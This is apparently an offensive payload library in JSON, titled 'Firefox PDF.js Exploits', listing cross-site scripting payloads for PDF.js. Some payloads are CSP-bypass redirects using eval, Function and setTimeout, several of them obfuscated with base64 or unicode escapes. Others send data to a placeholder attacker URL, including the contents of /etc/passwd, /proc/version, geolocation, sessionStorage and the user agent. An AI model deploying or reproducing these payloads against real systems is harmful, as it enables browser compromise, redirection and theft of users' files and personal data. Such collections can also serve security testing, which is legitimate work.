{
  "metadata": {
    "browser": "firefox",
    "name": "Firefox PDF.js Exploits",
    "description": "Firefox/PDF.js specific XSS payloads targeting CSP bypass, SpiderMonkey engine, and content security policy evasion",
    "total_payloads": 18,
    "categories": [
      "dom_access",
      "file_system",
      "csp_bypass",
      "network_exfiltration"
    ],
    "cve_references": [
      "CVE-2019-11707",
      "CVE-2020-6819",
      "CVE-2021-23961",
      "CVE-2022-28281"
    ]
  },
  "payloads": [
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "firefox",
      "technique": "csp_bypass_firefox_1_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHBhcmVudCAhPT0gJ3VuZGVmaW5lZCcpIGV2YWwoJ3BhcmVudC5sb2NhdGlvbiA9ICJodHRwOi8vdGVzdC5jb20iJyk7IH0gY2F0Y2goZSkgeyBjb25zb2xlLmxvZygnRmlyZWZveCBDU1AgYmxvY2tlZDonLCBlKTsgfQ=='); (new Function(decoded))(); } catch(e) { try { if(typeof parent !== 'undefined') eval('parent.location = \"http://test.com\"'); } catch(e) { console.log('Firefox CSP blocked:', e); } } })();",
      "description": "Firefox PDF.js CSP bypass via try { if(typeof parent !== 'un... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281"
    },
    {
      "id": "xss_pdf_0002",
      "category": "dom_access",
      "browser": "firefox",
      "technique": "csp_bypass_firefox_1_2",
      "payload": "try { if(typeof parent !== 'undefined') eval('parent.location = \"http://test.com\"'); } catch(e) { console.log('Firefox CSP blocked:', e); }",
      "description": "Firefox PDF.js CSP bypass via try { if(typeof parent !== 'un... (obf: eval_alternatives)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281"
    },
    {
      "id": "xss_pdf_0003",
      "category": "dom_access",
      "browser": "firefox",
      "technique": "csp_bypass_firefox_1_3",
      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0069\\u0066\\u0028\\u0074\\u0079\\u0070\\u0065\\u006f\\u0066\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u0020\\u0021\\u003d\\u003d\\u0020\\u0027\\u0075\\u006e\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0064\\u0027\\u0029\\u0020\\u0065\\u0076\\u0061\\u006c\\u0028\\u0027\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0022\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0063\\u006f\\u006d\\u0022\\u0027\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u002e\\u006c\\u006f\\u0067\\u0028\\u0027\\u0046\\u0069\\u0072\\u0065\\u0066\\u006f\\u0078\\u0020\\u0043\\u0053\\u0050\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0065\\u0064\\u003a\\u0027\\u002c\\u0020\\u0065\\u0029\\u003b\\u0020\\u007d",
      "description": "Firefox PDF.js CSP bypass via try { if(typeof parent !== 'un... (obf: unicode)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281"
    },
    {
      "id": "firefox_001",
      "category": "dom_access",
      "technique": "basic_alert",
      "payload": "alert(document.domain)",
      "description": "Basic Firefox PDF.js domain disclosure via alert",
      "risk_level": "low",
      "browser": "firefox"
    },
    {
      "id": "firefox_002",
      "category": "csp_bypass",
      "technique": "eval_parent_access",
      "payload": "try { if(typeof parent !== 'undefined') eval('parent.location = \"{url}\"'); } catch(e) { console.log('Firefox CSP blocked:', e); }",
      "description": "Firefox PDF.js CSP bypass via eval and parent access",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_003",
      "category": "csp_bypass",
      "technique": "function_constructor",
      "payload": "try { Function('return typeof parent !== \"undefined\" ? parent : window')().location = '{url}'; } catch(e) { }",
      "description": "Firefox PDF.js CSP bypass using Function constructor",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_004",
      "category": "csp_bypass",
      "technique": "settimeout_bypass",
      "payload": "try { setTimeout('if(typeof parent !== \"undefined\") parent.location=\"{url}\"', 100); } catch(e) { }",
      "description": "Firefox PDF.js CSP bypass using setTimeout for delayed execution",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_005",
      "category": "network_exfiltration",
      "technique": "fetch_data_exfil",
      "payload": "try { setInterval('fetch(\"{url}?ping=\" + Date.now())', 5000); } catch(e) { }",
      "description": "Firefox PDF.js periodic data exfiltration via fetch",
      "risk_level": "medium",
      "browser": "firefox"
    },
    {
      "id": "firefox_006",
      "category": "file_system",
      "technique": "file_read_exfiltration",
      "payload": "fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('{url}/exfil?data='+encodeURIComponent(t)))",
      "description": "Firefox PDF.js file system access to read and exfiltrate /etc/passwd",
      "risk_level": "critical",
      "browser": "firefox"
    },
    {
      "id": "firefox_007",
      "category": "dom_access",
      "technique": "dom_manipulation",
      "payload": "document.body.innerHTML='<h1>This PDF has been hacked</h1><img src=x onerror=alert(document.domain)>'",
      "description": "Firefox PDF.js DOM manipulation to inject malicious HTML",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_008",
      "category": "dom_access",
      "technique": "geolocation_exfiltration",
      "payload": "navigator.geolocation.getCurrentPosition(position=>fetch('{url}/geolocation?lat='+position.coords.latitude+'&lon='+position.coords.longitude))",
      "description": "Firefox PDF.js geolocation access and data exfiltration",
      "risk_level": "medium",
      "browser": "firefox"
    },
    {
      "id": "firefox_009",
      "category": "dom_access",
      "technique": "indexeddb_manipulation",
      "payload": "var request=indexedDB.open('malicious',1);request.onupgradeneeded=function(e){var db=e.target.result;var store=db.createObjectStore('data',{keyPath:'id'});store.add({id:1,value:'compromised'});fetch('{url}/indexeddb?status=created');}",
      "description": "Firefox PDF.js IndexedDB manipulation to create malicious database",
      "risk_level": "medium",
      "browser": "firefox"
    },
    {
      "id": "firefox_010",
      "category": "dom_access",
      "technique": "sessionstorage_exfiltration",
      "payload": "sessionStorage.setItem('userAuth','compromised');fetch('{url}/sessionstorage?data='+sessionStorage.getItem('userAuth'))",
      "description": "Firefox PDF.js sessionStorage manipulation and data exfiltration",
      "risk_level": "medium",
      "browser": "firefox"
    },
    {
      "id": "firefox_011",
      "category": "file_system",
      "technique": "fetch_proc_version",
      "payload": "try { fetch('file:///proc/version').then(r => r.text()).then(d => location = '{url}?version=' + btoa(d)); } catch(e) { }",
      "description": "Firefox PDF.js file system access to read system version information",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_012",
      "category": "file_system",
      "technique": "file_input_manipulation",
      "payload": "try { var input = document.createElement('input'); input.type = 'file'; input.webkitdirectory = true; input.click(); } catch(e) { }",
      "description": "Firefox PDF.js file input manipulation to access directory structure",
      "risk_level": "medium",
      "browser": "firefox"
    },
    {
      "id": "firefox_013",
      "category": "csp_bypass",
      "technique": "worker_thread_exploit",
      "payload": "try { var w = new Worker('data:text/javascript,postMessage(\"{url}\")'); } catch(e) { }",
      "description": "Firefox PDF.js worker thread exploitation for CSP bypass",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_014",
      "category": "csp_bypass",
      "technique": "document_write_bypass",
      "payload": "try { document.write('<script src=\"data:text/javascript,location=\\\"{url}\\\"\"></script>'); } catch(e) { }",
      "description": "Firefox PDF.js CSP bypass using document.write with data URI",
      "risk_level": "high",
      "browser": "firefox"
    },
    {
      "id": "firefox_015",
      "category": "network_exfiltration",
      "technique": "xhr_data_exfil",
      "payload": "try { fetch('{url}', {method: 'POST', body: navigator.userAgent + '|' + location.href}); } catch(e) { }",
      "description": "Firefox PDF.js data exfiltration via XMLHttpRequest POST",
      "risk_level": "medium",
      "browser": "firefox"
    }
  ]
}